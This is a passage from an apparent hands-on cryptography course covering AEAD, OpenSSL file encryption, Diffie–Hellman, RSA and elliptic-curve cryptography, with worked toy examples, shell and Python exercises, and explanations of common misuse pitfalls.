age -r $(grep 'public key' key.txt | cut -d: -f2 | tr -d ' ') -o secret.age secret.txt
age -d -i key.txt secret.age
```

### Common confusions

- **"AEAD is slower because it does two things."** GCM and Poly1305 are designed
  for this; the overhead is small, and it's far faster than encrypt + separate
  HMAC.
- **"I don't need AAD."** Use it for anything that travels in the clear but must
  not be swapped: record IDs, versions, key IDs, S3 object keys. It prevents
  *ciphertext substitution* attacks.
- **"The tag is optional if I trust the network."** No. TLS terminates somewhere,
  storage gets tampered with, and "trusted" networks get breached.

### Check yourself

1. What two properties does AEAD provide?
2. What is AAD, and give a concrete use for it.
3. What is returned if the tag check fails?
4. Why is nonce reuse worse in GCM than in CTR?
5. Why must `openssl enc` be used with `-pbkdf2 -iter`?

### Further reading

- **RFC 5116** — the AEAD interface definition. Short.
- **RFC 8439** — ChaCha20 and Poly1305. Unusually clear for an RFC, with test
  vectors.
- **Tool:** `age` (`github.com/FiloSottile/age`) — read its design rationale; it's
  a masterclass in making crypto hard to misuse.
- **Article:** "Cryptographic Right Answers" (Latacora) — the AEAD section.

---

## Chapter 16 — Hands-on: symmetric encryption with OpenSSL

### Why this chapter exists

OpenSSL is the tool you will actually reach for. It is also notoriously
unfriendly. This chapter is the practical drill.

### Generating keys and random data

```bash
cd ~/sec-lab/scratch

openssl rand -hex 32          # 256-bit key as hex
openssl rand -base64 32       # 256-bit key as base64
openssl rand -out key.bin 32  # raw bytes to a file

# NEVER generate keys with: date, PID, rand(), or a password you made up.
# Use the OS CSPRNG -- which is what `openssl rand` does.
```

### Password-based encryption (the common case)

```bash
echo "the launch code is 0000" > plan.txt

# ENCRYPT -- always include -pbkdf2 and a high -iter
openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt \
        -in plan.txt -out plan.enc

# DECRYPT
openssl enc -d -aes-256-cbc -pbkdf2 -iter 600000 -in plan.enc

# Base64-armour it for email/JSON transport (-a)
openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt -a -in plan.txt -out plan.b64
cat plan.b64
```

**What each flag does:**

| Flag | Why it matters |
|---|---|
| `-aes-256-cbc` | The cipher and mode |
| `-pbkdf2` | Use PBKDF2 for key derivation. **Without it, OpenSSL uses one round of MD5.** |
| `-iter 600000` | PBKDF2 iterations. Higher = slower to crack. |
| `-salt` | Random salt (default on, but be explicit) |
| `-a` | Base64-encode the output |
| `-d` | Decrypt |
| `-K` / `-iv` | Supply a raw key/IV in hex instead of a password |

### Raw key and IV (when you manage keys yourself)

```bash
KEY=$(openssl rand -hex 32)     # 32 bytes = 64 hex chars for AES-256
IV=$(openssl rand -hex 16)      # 16 bytes = 32 hex chars

openssl enc -aes-256-cbc -K "$KEY" -iv "$IV" -in plan.txt -out plan.raw
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$IV" -in plan.raw
```

> **Dangerous:** anything on a command line is visible in `ps` output and your
> shell history. For real work, pass keys via a file, an environment variable, or
> stdin — never as an argument.

### Inspecting what you produced

```bash
# The OpenSSL container format starts with "Salted__" + 8 salt bytes
xxd plan.enc | head -2

# Compare sizes -- note the padding and the salt header
ls -l plan.txt plan.enc
```

### Practice (30 min) — the drill

Do these without looking back:

1. Generate a 256-bit key and save it to `mykey.hex`.
2. Encrypt a file with AES-256-CBC using that key and a random IV. Store the IV
   with the ciphertext.
3. Decrypt it again.
4. Encrypt the same file **twice** with the same key but different IVs. Confirm
   the ciphertexts differ.
5. Now encrypt twice with the **same** IV. Confirm they're identical — and
   explain why that's a leak.
6. Corrupt one byte of a ciphertext and decrypt. What happens? (CBC: garbled
   first block, then correct. **No error.** That's the missing integrity.)
7. Repeat step 6 with AEAD in Python. Note that it *refuses* to decrypt.

**Step 6 vs 7 is the point of the whole Part.**

### The OpenSSL survival guide

```bash
openssl version -a                  # version and build config
openssl list -cipher-algorithms     # what ciphers are available (OpenSSL 3.x)
openssl errstr 0A000086             # decode a cryptic error code
openssl enc -help                   # flags for a subcommand
```

Appendix B has the full cookbook.

### Common confusions

- **"`openssl enc` uses AES-GCM if I ask."** It technically accepts the flag but
  cannot handle the authentication tag, so the result is **not authenticated**.
  Use a real library or `age`.
- **"The salt makes it secure."** The salt prevents precomputation. The
  *iterations* make it slow. You need both.
- **"I'll pipe the key in with `echo`."** `echo` may leave it in history and in
  process listings. Use `-pass file:...` or `-pass env:VAR`.

### Check yourself

1. What happens if you omit `-pbkdf2`?
2. Why must the IV be stored alongside the ciphertext, and is it secret?
3. Why is passing a key as a command-line argument dangerous?
4. Why can't `openssl enc` do proper AES-GCM?

### Further reading

- **Book:** *OpenSSL Cookbook* — Ivan Ristić. **Free.** The clearest OpenSSL
  reference in existence; you'll use it throughout Parts 5–7.
- **Docs:** `openssl-enc(1)` man page.
- **Tool:** `age` — for when you want file encryption that's hard to get wrong.

---

### End of Part 4 — Milestone check

- [ ] I can state Kerckhoffs's principle and why it matters
- [ ] I know why key/nonce reuse is catastrophic, and can demonstrate it
- [ ] **I have seen the ECB penguin with my own eyes**
- [ ] I can explain why CBC needs a MAC and GCM doesn't
- [ ] I know the nonce rule for AEAD
- [ ] **I have encrypted and decrypted files with OpenSSL**
- [ ] I have watched AEAD refuse to decrypt tampered data

---

# Part 5 — Asymmetric cryptography

Symmetric crypto (Part 4) is fast but has one enormous problem: **both sides need
the same key, and getting it to them is the whole difficulty.** Asymmetric
cryptography solves that, and in doing so makes HTTPS, SSH, signed software, and
the entire public internet of trust possible.

## Chapter 17 — The key-distribution problem and the big idea

### In one sentence

Public-key cryptography gives everyone a **pair** of mathematically linked keys —
one public, one private — so two strangers can communicate securely without ever
having met.

### The problem

You have AES-256. It's unbreakable in practice. Now encrypt a message to someone
you've never met, over a network an attacker is watching.

```
   You need the recipient to have the key.
   You can't send the key over the network -- the attacker sees it.
   You can't have pre-shared it -- you've never met.
   You can't phone them -- the attacker may be on the phone line too,
       and anyway this has to work for a billion strangers at once.
```

This is the **key-distribution problem**, and for most of history there was no
good answer. Militaries used couriers with locked briefcases. It did not scale.

```
   n people who all want to talk securely, pairwise, with symmetric keys:

        n = 10     ->  45 keys
        n = 1000   ->  499,500 keys
        n = 1e6    ->  ~500 billion keys

   Every new person needs a securely-delivered key to everyone else.
```

### The idea in plain language

In 1976, Diffie and Hellman published an idea that sounds impossible:

> What if encryption and decryption used **different** keys — and knowing the
> encryption key told you **nothing** useful about the decryption key?

Then you could **publish** the encryption key. Anyone — including your enemy —
could use it to encrypt a message to you. But only you, holding the matching
private key, could decrypt.

```
   ASYMMETRIC = a PAIR of keys

     PUBLIC KEY                          PRIVATE KEY
     - you publish it everywhere         - you never share it, ever
     - put it in DNS, on your website,   - it lives in one place
       on your business card            - losing it = losing your identity
     - anyone can have it                - leaking it = total compromise

   The two keys are linked by hard maths. What one does, only the other undoes.
```

### The two things it lets you do

```
   1. ENCRYPT TO SOMEONE (confidentiality)
      Encrypt with their PUBLIC key  ->  only their PRIVATE key decrypts.
      "Anyone can put mail in the mailbox; only the owner has the key to open it."

   2. SIGN SOMETHING (authenticity + integrity)
      Sign with YOUR PRIVATE key     ->  anyone verifies with your PUBLIC key.
      "Only you can produce your wax seal; anyone can check it's yours."
```

Direction matters. Encrypt-to = *their* public key. Sign = *your* private key.
Mixing these up is one of the most common conceptual errors — keep the mailbox
and wax-seal analogies handy.

### The catch: it's slow, so we use it sparingly

Asymmetric operations are **hundreds to thousands of times slower** than AES, and
can only operate on small inputs. So the real world uses a **hybrid** scheme:

```
   1. Use asymmetric crypto ONCE to agree on a random symmetric key
        (this is called KEY ENCAPSULATION or KEY EXCHANGE)
   2. Use fast symmetric AEAD (AES-GCM / ChaCha20) for all the actual data
```

Every HTTPS connection you've ever made works exactly this way. Chapters 18–20
are the "step 1" options; Part 7 shows them assembled into TLS.

### The three problems and which primitive solves each

| Problem | Primitive | Chapters |
|---|---|---|
| Agree on a shared secret over a hostile network | **Diffie–Hellman** / ECDH | 18, 20 |
| Encrypt a small blob to a public key | **RSA-OAEP** / KEM | 19 |
| Prove a message came from you, unchanged | **Signatures** (RSA-PSS, ECDSA, EdDSA) | 21 |
| ...and prove *who* a public key belongs to | **Certificates / PKI** | Part 7 |

That last row is the one people forget. Public-key crypto lets a stranger send
you a secret — but *which* stranger? Binding a key to an identity is a separate
problem, and it's what certificates exist for.

### Practice (15 min)

```bash
mkdir -p ~/sec-lab/scratch && cd ~/sec-lab/scratch

# Make a keypair. Look at both halves.
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out priv.pem
openssl pkey -in priv.pem -pubout -out pub.pem

wc -c priv.pem pub.pem          # the private file is bigger -- it contains more
cat pub.pem                     # SHARE THIS
head -2 priv.pem; echo "..."    # NEVER share this

# The public key is DERIVED from the private key -- not the other way around
openssl pkey -in priv.pem -pubout | diff - pub.pem && echo "same public key"
```

**Think it through:** why can you regenerate the *public* key from the private
key, but not the reverse? (That asymmetry is the entire field. Chapters 18–20 are
three different hard problems that provide it.)

### Common confusions

- **"The public and private keys are interchangeable."** They are not. Each has a
  specific role. For RSA they happen to be structurally similar; for DH and
  elliptic curves they look nothing alike.
- **"Asymmetric crypto replaced symmetric crypto."** No — it *bootstraps* it.
  Bulk data is always encrypted symmetrically.
- **"If I have someone's public key, I can impersonate them."** No — you can
  encrypt *to* them and verify *their* signatures. You cannot sign as them.
- **"A bigger RSA key is like a bigger AES key."** The numbers aren't comparable.
  RSA-2048 ≈ AES-112 in strength. See Chapter 20's table.

### Check yourself

1. State the key-distribution problem in one sentence.
2. Which key do you use to encrypt a message *to* someone? Which to sign?
3. Why does the real world use hybrid (asymmetric + symmetric) encryption?
4. Public-key crypto lets a stranger send you a secret. What problem does it
   *not* solve on its own?

*(Answers: Appendix F.)*

### Further reading

- **Paper:** "New Directions in Cryptography" — Diffie & Hellman, 1976. The
  founding document. Readable, and only a few pages.
- **Book:** *Serious Cryptography* (2nd ed.), Chapters 9–12.
- **Video:** Computerphile, "Public Key Cryptography" and "Diffie Hellman — the
  Mathematics bit".
- **Book (accessible history):** *The Code Book*, Simon Singh — the chapter on
  the invention of public-key crypto (and GCHQ's secret earlier discovery).

---

## Chapter 18 — Diffie–Hellman key exchange

### In one sentence

Diffie–Hellman lets two parties who have never met derive an identical shared
secret by exchanging public values, such that an eavesdropper who sees everything
still cannot compute it.

### The idea: mixing paint

The standard analogy, and it's a good one:

```
   1. Alice and Bob publicly agree on a common paint colour   (yellow).
   2. Each secretly picks a private colour and mixes it with yellow.
        Alice:  yellow + red    = orange       (she sends orange to Bob)
        Bob:    yellow + blue   = green         (he sends green to Alice)
   3. Each adds their OWN secret colour to the paint they RECEIVED.
        Alice:  green  + red    = brown
        Bob:    orange + blue   = brown
   4. Both now hold BROWN. The eavesdropper saw yellow, orange, and green --
      and cannot un-mix them to find red or blue, so cannot make brown.
```

"Un-mixing paint is hard" stands in for a real mathematical one-way operation.

### How it actually works (the maths, kept small)

Everything happens in **modular arithmetic** (§0.5) — clock arithmetic — which
makes the operations easy to do forwards and infeasible to reverse.

```
   PUBLIC PARAMETERS (everyone knows these, they can be baked into a standard):
     p = a large prime          (toy value: 23)
     g = a generator            (toy value: 5)

   ALICE                                   BOB
     picks secret a = 6                      picks secret b = 15
     A = g^a mod p                           B = g^b mod p
       = 5^6  mod 23 = 8                       = 5^15 mod 23 = 19
     --- sends A = 8 ------------------->
                            <------------- sends B = 19 ---
     s = B^a mod p                           s = A^b mod p
       = 19^6 mod 23 = 2                       = 8^15 mod 23 = 2

   BOTH now share s = 2.  It works because  (g^a)^b = g^(ab) = (g^b)^a  mod p.
```

The eavesdropper has `p, g, A=8, B=19`. To find `s` they must recover `a` from
`A = g^a mod p` — the **discrete logarithm problem**. For a 2048-bit prime,
nobody knows how to do this in less than astronomical time.

**Real parameters:** `p` is 2048–4096 bits (a standardised "MODP group" or, far
better, an elliptic curve — Chapter 20). The secrets are similarly large random
numbers.

### The property that makes DH special: forward secrecy

If Alice and Bob generate a **fresh** `a` and `b` for every session and throw
them away afterwards, then:

```
   An attacker who records all the encrypted traffic today, and YEARS LATER
   steals Alice's long-term private key, STILL cannot decrypt that traffic.

   The session secret depended on ephemeral values that no longer exist.
```

This is **forward secrecy** (sometimes "perfect forward secrecy", PFS). It's why
modern TLS *always* uses **ephemeral** Diffie–Hellman (**ECDHE**) and why RSA key
exchange was removed entirely in TLS 1.3. The letter **E** on the end —
DHE, ECDHE — means "ephemeral" and is the part that matters.

```
   DH   -- static, keys reused        -> NO forward secrecy   (don't)
   DHE  -- ephemeral, fresh per       -> forward secrecy       (finite-field)
           session
   ECDHE-- ephemeral, elliptic curve  -> forward secrecy, fast (USE THIS)
```

### What DH does NOT give you

```
   DH gives you a shared secret with SOMEONE.
   It does not tell you WHO.
```

Raw DH is wide open to a **man-in-the-middle**: Mallory does a separate DH
exchange with each of Alice and Bob, sits in the middle, and relays (re-encrypted)
traffic. Both think they have a private channel; Mallory reads everything.

**The fix is authentication**: one or both parties **sign** their DH public value
with a long-term key whose owner you can verify (via a certificate — Part 7, or a
known SSH host key — Part 8). DH + signatures is the actual handshake.

### Worked example (run it)

```bash
cd ~/sec-lab/scratch

python3 - <<'PY'
# Toy DH by hand
p, g = 23, 5
a, b = 6, 15                                  # secrets
A, B = pow(g, a, p), pow(g, b, p)            # public values, sent on the wire
s_alice = pow(B, a, p)
s_bob   = pow(A, b, p)
print(f"A (Alice sends) = {A}")
print(f"B (Bob sends)   = {B}")
print(f"Alice computes s = {s_alice}")
print(f"Bob computes   s = {s_bob}")
assert s_alice == s_bob
print("shared secret:", s_alice)

# The eavesdropper's task: find 'a' such that 5^a mod 23 == 8  (discrete log)
for guess in range(p):
    if pow(g, guess, p) == A:
        print(f"eavesdropper brute-forced a = {guess} (trivial at p=23,")
        print(" utterly infeasible at p = 2^2048)")
        break
PY
```

**Real X25519 (the modern, elliptic-curve DH):**

```bash
cd ~/sec-lab/scratch
python3 -m venv .venv 2>/dev/null; .venv/bin/pip install -q cryptography

.venv/bin/python - <<'PY'
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey

alice = X25519PrivateKey.generate()
bob   = X25519PrivateKey.generate()

# each sends the other their PUBLIC key, then:
s_alice = alice.exchange(bob.public_key())
s_bob   = bob.exchange(alice.public_key())

print("Alice's shared secret:", s_alice.hex())
print("Bob's   shared secret:", s_bob.hex())
print("identical:", s_alice == s_bob, " length:", len(s_alice), "bytes")
# You'd now run this 32-byte secret through a KDF (HKDF) to get AEAD keys.
PY
```

> **Note:** LibreSSL (the `openssl` shipped with macOS) does **not** support
> X25519 via the CLI, and its `genpkey` output can trip up `pkeyutl`. This is the
> §0.4 trap. Use the Python `cryptography` library, or install real OpenSSL 3.x
> (`brew install openssl@3`) and put it first on your `PATH`.

### Practice (30 min)

1. Run the toy DH above. Change `a` and `b`; confirm both sides still agree.
2. Add a Mallory who runs DH separately with each side. Show that Alice and Bob
   end up with *different* secrets (Mallory's with each), and that Mallory can
   read both. This is the MITM — feel how easy it is without authentication.
3. Run the X25519 example. Feed the shared secret through HKDF
   (`cryptography.hazmat.primitives.kdf.hkdf`) to derive a 32-byte AES key.
4. In `notes.md`, explain in your own words why recording traffic today and
   stealing a key tomorrow doesn't break an ECDHE session.

### Common confusions

- **"DH encrypts my data."** It does not. It produces a *shared secret*. You then
  run it through a KDF and encrypt with AEAD.
- **"DH proves who I'm talking to."** No. Unauthenticated DH is MITM-able. It
  needs signatures on top.
- **"Static DH is fine."** It works, but you lose forward secrecy. Always use the
  ephemeral variant (DHE/ECDHE).
- **"The shared secret is the AES key."** Use it as *input* to a KDF, don't use it
  directly. Raw DH output isn't uniformly random and may have small subgroup
  quirks.

### Check yourself

1. In the paint analogy, what can't the eavesdropper do?
2. What hard problem protects finite-field Diffie–Hellman?
3. What does the "E" in ECDHE mean, and why does it matter?
4. What attack is raw, unauthenticated DH vulnerable to, and what's the fix?
5. What must you do to the shared secret before using it as an encryption key?

### Further reading

- **Video:** Computerphile, "Diffie Hellman — the Mathematics bit" (~8 min) and
  "Key Exchange Problems".
- **RFC 7748** — Curve25519 and Curve448. The spec behind X25519.
- **Article:** "Weak Diffie-Hellman and the Logjam Attack" (weakdh.org) — why
  small/shared/512-bit DH groups were a real-world disaster in 2015.
- **Interactive:** `cryptohack.org` — the Diffie–Hellman section has excellent
  hands-on challenges.

---

## Chapter 19 — RSA

### In one sentence

RSA is the original practical public-key algorithm: its security rests on the
difficulty of factoring the product of two large primes, and while it still works,
newer systems prefer elliptic curves.

### The idea

Multiplying two large primes is easy. Factoring the result back into those primes
is — as far as anyone knows publicly — extraordinarily hard.

```
   61 x 53 = 3233                    <- a child can do this
   factor 3233 -> ?                  <- have to search

   Now imagine each prime is ~1024 bits (~300 decimal digits).
   Multiplying: instant. Factoring: no classical computer will finish
   before the sun burns out.
```

### How it actually works (small numbers, fully worked)

```
   KEY GENERATION
     1. Pick two primes:        p = 61,  q = 53
     2. Modulus:                n = p*q = 3233
     3. Euler's totient:        phi = (p-1)(q-1) = 60*52 = 3120
     4. Pick public exponent:   e = 17          (must be coprime to phi;
                                                 real world: almost always 65537)
     5. Private exponent:       d = e^-1 mod phi = 2753
                                (check: 17 * 2753 = 46801 = 15*3120 + 1  OK)

     PUBLIC KEY  = (n=3233, e=17)
     PRIVATE KEY = (n=3233, d=2753)         [p, q, phi are kept or destroyed]

   ENCRYPT a message m = 65     (must have m < n)
     c = m^e mod n = 65^17 mod 3233 = 2790

   DECRYPT
     m = c^d mod n = 2790^2753 mod 3233 = 65      <- back to the original

   SIGN m = 65   (private-key operation -- the mirror of decryption)
     s = m^d mod n = 65^2753 mod 3233 = 588
   VERIFY
     m = s^e mod n = 588^17 mod 3233 = 65         <- matches, so signature valid
```

The symmetry is the elegance: **encryption and signing are the same operation**
with the keys swapped. (In practice they use different padding schemes and you
should never use one key for both.)

### The parts you must never skip: padding

**"Textbook RSA" — `c = m^e mod n` with no padding — is badly broken.**

```
   - Deterministic: same message -> same ciphertext. Attacker can build a
     dictionary, or detect repeats.
   - Malleable: c1 * c2 mod n decrypts to m1 * m2. Attacker can manipulate
     plaintext without decrypting.
   - Small messages: if m^e < n (e.g. m=2, e=3), just take the cube root.
```

Real RSA wraps the message in a randomised, structured padding:

| Scheme | Use | Status |
|---|---|---|
| **OAEP** | RSA **encryption** | Use this |
| **PKCS#1 v1.5** (encryption) | legacy encryption | **Avoid** — Bleichenbacher padding-oracle attacks, still resurfacing (ROBOT, 2017) |
| **PSS** | RSA **signatures** | Use this |
| **PKCS#1 v1.5** (signatures) | very common, still OK | Acceptable; PSS preferred |

### What RSA is actually used for

RSA does not encrypt your file. It encrypts (or "encapsulates") a small **random
symmetric key**, which then encrypts the file. The maximum message size is tiny:

```
   RSA-2048 with OAEP-SHA256:  can encrypt at most 190 bytes.
   That is enough for an AES-256 key (32 bytes) and nothing more.
   This is BY DESIGN -- RSA is a key-transport mechanism, not a data cipher.
```

Uses today: TLS certificates and signatures (still the majority of the web's
certs), code signing, JWT `RS256`, SSH keys, PGP.

### Key sizes and the slow decline

| RSA key size | Symmetric-equivalent strength | Verdict |
|---|---|---|
| 1024-bit | ~80 bits | **Broken-ish** — do not use, feasible for nation-states |
| **2048-bit** | ~112 bits | **Minimum acceptable today** |
| 3072-bit | ~128 bits | Good; matches AES-128 |
| 4096-bit | ~140 bits | Fine, noticeably slower, common for long-lived roots |

Note how much key you need for relatively modest strength — and RSA operations
get slow fast as the key grows. A 256-bit **elliptic-curve** key matches
RSA-3072. That efficiency gap is why new systems pick ECC (Chapter 20).

### RSA's real-world failure modes

Every one of these has caused real breaches:

```
   [ ] Weak randomness at key generation -> two keys share a prime -> both
       factor instantly (the 2012 "Mining your Ps and Qs" study found tens of
       thousands of such keys live on the internet).
   [ ] PKCS#1 v1.5 padding oracle (Bleichenbacher '98, revived as ROBOT 2017)
       -> decrypt or sign without the key.
   [ ] Using the SAME keypair for both encryption and signing.
   [ ] Small or shared public exponent (e = 3) with no/broken padding.
   [ ] Signature verification that doesn't check the padding structure
       -> forged signatures (the "BERserk" / e=3 class).
   [ ] Timing / power side channels during the private-key operation
       -> use a library with blinding.
```

### Worked example (run it)

```bash
cd ~/sec-lab/scratch

# --- the toy version, by hand ---
python3 - <<'PY'
def inv(a, m):
    g, x = m, 0
    x0, a0 = 1, a
    while a0:
        q = g // a0
        g, a0 = a0, g - q*a0
        x, x0 = x0, x - q*x0
    return x % m

p, q = 61, 53
n = p*q
phi = (p-1)*(q-1)
e = 17
d = inv(e, phi)
print(f"n={n}  phi={phi}  e={e}  d={d}")

m = 65
c = pow(m, e, n);  print(f"encrypt {m} -> {c}")
print(f"decrypt {c} -> {pow(c, d, n)}")
s = pow(m, d, n);  print(f"sign {m} -> {s}")
print(f"verify {s} -> {pow(s, e, n)}")

# malleability of TEXTBOOK RSA -- why padding exists
c2 = pow(2, e, n)
print(f"\n(c * enc(2)) mod n decrypts to {pow(c*c2, d, n)}  == 65*2 = 130")
print("attacker doubled the plaintext without decrypting. OAEP prevents this.")
PY
```

```bash
# --- real RSA with OpenSSL ---
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out rsa.pem
openssl pkey -in rsa.pem -pubout -out rsa.pub

# inspect it
openssl pkey -in rsa.pem -text -noout | head -20

# encrypt a SMALL secret with OAEP (this is real OpenSSL 3.x syntax)
echo -n "this is a 32-byte AES key ......." > aeskey.bin
openssl pkeyutl -encrypt -pubin -inkey rsa.pub -in aeskey.bin -out aeskey.enc \
        -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
openssl pkeyutl -decrypt -inkey rsa.pem -in aeskey.enc \
        -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256

# sign a document with PSS
echo "transfer 100 to alice" > doc.txt
openssl dgst -sha256 -sign rsa.pem -sigopt rsa_padding_mode:pss -out doc.sig doc.txt
openssl dgst -sha256 -verify rsa.pub -sigopt rsa_padding_mode:pss \
        -signature doc.sig doc.txt        # -> "Verified OK"

# tamper and re-verify
echo "transfer 100 to mallory" > doc.txt
openssl dgst -sha256 -verify rsa.pub -sigopt rsa_padding_mode:pss \
        -signature doc.sig doc.txt        # -> "Verification Failure"
```

> **macOS note:** the `pkeyutl -encrypt` line needs OpenSSL 3.x; the LibreSSL
> build fails on the key format. The Python equivalent below always works.

```bash
.venv/bin/python - <<'PY'
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key()

# encrypt a 32-byte key with OAEP
secret = b"x" * 32
ct = pub.encrypt(secret, padding.OAEP(
        mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
print("ciphertext bytes:", len(ct))                 # 256 for RSA-2048
print("decrypts back:", key.decrypt(ct, padding.OAEP(
        mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(),
        label=None)) == secret)

# how big can the message be?
for size in (32, 190, 191, 245):
    try:
        pub.encrypt(b"x"*size, padding.OAEP(
            mgf=padding.MGF1(hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None))
        print(f"  {size} bytes: OK")
    except ValueError:
        print(f"  {size} bytes: TOO BIG for RSA-2048 + OAEP-SHA256")
PY
```

### Practice (35 min)

1. Do the toy RSA by hand on paper with `p=11, q=17, e=7`. Compute `n`, `phi`,
   `d`. Encrypt `m=8`. Check your `d` with Python.
2. Generate a real 2048-bit key. Time 1000 signatures vs 1000 verifications
   (`openssl speed rsa2048`). Notice signing (private key) is ~30x slower than
   verifying. Explain why that shapes protocol design.
3. Run the malleability demo. Then read one paragraph on OAEP and write, in
   `notes.md`, how it breaks the attack.
4. Find the largest message RSA-2048+OAEP-SHA256 will encrypt (the Python loop
   above). Explain why this makes RSA a *key-transport* primitive.
5. Generate a 1024-bit key and a 4096-bit key. Compare `openssl speed` numbers
   across all three sizes and tabulate them.

### Common confusions

- **"RSA encrypts my files."** It encrypts a ~32-byte symmetric key. AES encrypts
  the files.
- **"Textbook RSA is RSA."** Textbook (unpadded) RSA is a broken toy. Real RSA is
  RSA + OAEP or RSA + PSS.
- **"RSA-4096 is twice as strong as RSA-2048."** It's roughly 112 → 140 bits.
  Diminishing returns, rising cost.
- **"RSA is quantum-safe if the key is big enough."** No. Shor's algorithm
  factors any RSA key in polynomial time on a large quantum computer. Size does
  not help. (Part 6.)
- **"I'll use my RSA key for both TLS and signing releases."** Use separate keys
  with separate purposes. Cross-protocol attacks are real.

### Check yourself

1. What hard problem is RSA based on?
2. What is the usual value of `e`, and why that number?
3. Why is textbook (unpadded) RSA insecure? Name two reasons.
4. What is the maximum useful message size for RSA-2048, and what does that tell
   you about RSA's role?
5. Which padding scheme for encryption? Which for signatures?
6. Does increasing the RSA key size protect against quantum attacks?

### Further reading

- **Original paper:** "A Method for Obtaining Digital Signatures and Public-Key
  Cryptosystems" — Rivest, Shamir, Adleman, 1978.
- **Article:** "Seriously, stop using RSA" (Trail of Bits blog) — a well-argued
  case for preferring elliptic curves, with a clear tour of RSA's footguns.
- **Study:** "Mining Your Ps and Qs" (Heninger et al., 2012) — the internet-wide
  scan that found thousands of factorable live keys.
- **Site:** `robotattack.org` — the 2017 revival of Bleichenbacher's 1998 attack.
- **Challenges:** `cryptopals.com` Set 5–6 — implement (and break) RSA yourself.
  The single best way to understand it.

---

## Chapter 20 — Elliptic curve cryptography

### In one sentence

Elliptic-curve cryptography gives the same security as RSA with far smaller keys
and faster operations, by replacing "multiply big primes" with arithmetic on
points of a curve.

### Why bother — the size argument

```
   Security level     RSA / finite-field DH      Elliptic curve
   --------------     ---------------------      --------------
      ~80 bits              1024-bit                  160-bit
     ~112 bits              2048-bit                  224-bit
     ~128 bits              3072-bit                  256-bit      <- the sweet spot
     ~192 bits              7680-bit                  384-bit
     ~256 bits             15360-bit                  512-bit
```

A 256-bit ECC key matches a 3072-bit RSA key. Smaller keys mean smaller
certificates, less bandwidth in every handshake, less storage on constrained
devices, and much faster key generation and signing. On the modern web, most new
certificates and virtually all key exchange are elliptic-curve.

### The idea in plain language

An elliptic curve is the set of points satisfying an equation like
`y^2 = x^3 + ax + b`. There's a way to "add" two points on the curve to get a
third point on the curve (draw a line through them; where it hits the curve
again, reflect over the x-axis).

```
   "Adding" a point P to itself k times is called SCALAR MULTIPLICATION:  k*P

   FORWARD:   given k and P, computing Q = k*P is fast.
   REVERSE:   given P and Q, finding k is the ELLIPTIC-CURVE DISCRETE
              LOGARITHM PROBLEM (ECDLP) -- and the best known attack is
              roughly the square root of the group size, nothing better.

   That "nothing better" is why ECC keys can be small: no sub-exponential
   factoring-style shortcut is known, unlike RSA and finite-field DH.
```

Your **private key** is the scalar `k` (a random ~256-bit number). Your
**public key** is the point `Q = k*P`, where `P` is a fixed base point in the
curve's published parameters.

### The curves you'll actually meet

| Curve | Also called | Use | Notes |
|---|---|---|---|
| **P-256** | secp256r1, prime256v1 | ECDSA signatures, ECDH | NIST curve; ubiquitous in TLS certs |
| **P-384** | secp384r1 | Higher-security ECDSA/ECDH | NSA "CNSA" suite |
| **Curve25519** | via **X25519** (ECDH), **Ed25519** (signatures) | Modern default | Designed by Bernstein; fast, misuse-resistant, no parameter mystery |
| **Curve448** | X448 / Ed448 | Higher-security modern | Less common |
| **secp256k1** | — | Bitcoin, Ethereum | Rare outside blockchain |

```
   For NEW systems, the simple advice:
     Key exchange  -> X25519      (fall back to P-256 for compatibility)
     Signatures    -> Ed25519     (fall back to ECDSA P-256)
```

**Why prefer 25519 over the NIST P-curves?** The NIST curves have unexplained
"random" constants, which fed (largely unproven) worry after the Dual_EC_DRBG
backdoor. More concretely, the P-curves are **hard to implement in constant time**
and have sharp edges (point validation, the `k` in ECDSA). Curve25519 was
engineered so the safe implementation is the natural one.

### ECDH — elliptic-curve Diffie–Hellman

Exactly the Chapter 18 protocol, with scalar multiplication instead of modular
exponentiation:

```
   Alice: private a, public A = a*P
   Bob:   private b, public B = b*P
   Shared: a*B = a*(b*P) = b*(a*P) = b*A       -> same point, both sides
```

Ephemeral ECDH is **ECDHE** — the key exchange in every modern TLS and SSH
session, providing the forward secrecy from Chapter 18.

### ECDSA — and its one deadly footgun

ECDSA (the elliptic-curve signature algorithm) requires a **random per-signature
value `k`** (a "nonce", confusingly — nothing to do with AEAD nonces).

```
   +--------------------------------------------------------------+
   |  If k is EVER reused for two different messages, OR if k is   |
   |  even slightly predictable, THE PRIVATE KEY CAN BE COMPUTED    |
   |  with simple algebra from the two signatures.                 |
   +--------------------------------------------------------------+

   Real incidents:
     * Sony PlayStation 3 (2010) -- Sony used a FIXED k. The ECDSA
       code-signing key was extracted. Total, permanent compromise.
     * Numerous Bitcoin wallet thefts from bad RNGs producing repeated k.
     * Android SecureRandom bug (2013) drained Bitcoin wallets.
```

**The fix: deterministic ECDSA (RFC 6979)** derives `k` from the private key and
the message hash via HMAC, so it's unique and unpredictable without needing a
good RNG at signing time. Use a library that does this. Or — better — use
**Ed25519**, which is deterministic by construction and has no `k` to leak.

### Ed25519 — the one to reach for

```
   + Deterministic       -> no RNG-at-signing footgun, no k reuse possible
   + Fast                 -> ~15,000+ sign/verify per second, easily
   + Small               -> 32-byte public key, 64-byte signature
   + Misuse-resistant     -> no parameter choices, no point-validation traps
   + Built-in hashing     -> you sign the message directly, not a pre-hash

   Used by: OpenSSH (default keytype since 2014), Signal, WireGuard, age,
            Tor, TLS 1.3 (Ed25519 certs), most Linux package signing,
            most modern language stdlibs.
```

### Worked example (run it)

```bash
cd ~/sec-lab/scratch

# --- Ed25519 with OpenSSL 3.x (works even on LibreSSL for Ed25519 gen/sign) ---
openssl genpkey -algorithm ed25519 -out ed.pem
openssl pkey -in ed.pem -pubout -out ed.pub
